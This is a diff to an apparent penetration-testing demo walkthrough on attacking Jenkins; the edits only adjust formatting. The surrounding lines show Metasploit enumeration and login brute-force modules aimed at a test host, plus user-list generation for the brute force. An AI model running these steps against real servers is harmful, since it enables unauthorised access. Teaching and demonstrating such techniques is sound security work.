@@ -8,6 +8,7 @@ Let's get some details of Jenkins
 
 ```bash
 msfconsole
+
 use auxiliary/scanner/http/jenkins_enum
 set RHOSTS jenkins.test.nevervictimconsult.xyz
 set RPORT 8080
@@ -52,6 +53,7 @@ Jeffrey van der Linden
 
 ```bash
 python3 userlistcreator.py
+
 mv output.txt /root/demotalk/jenkinsBrute/userlist.txt
 cd /root/demotalk/jenkinsBrute/
 ```
@@ -72,9 +74,9 @@ If we want to access Jenkins as a user, we need to find a bit more information o
 
 #### Get Login URL
 There are typically two login-URLs in Jenkins-world
-* /j_acegi_security_check
-* j_spring_security_check
-or something the Administrator configured (like PingAccess or so)
+* `/j_acegi_security_check`
+* `/j_spring_security_check`
+* or something the Administrator configured (like PingAccess or so)
 
 Let's use Burpsuite to find out details.
 
@@ -84,6 +86,7 @@ The exploit must be configured.
 
 ```bash
 msfconsole
+
 use auxiliary/scanner/http/jenkins_login
 set RHOSTS jenkins.test.nevervictimconsult.xyz
 set RPORT 8080
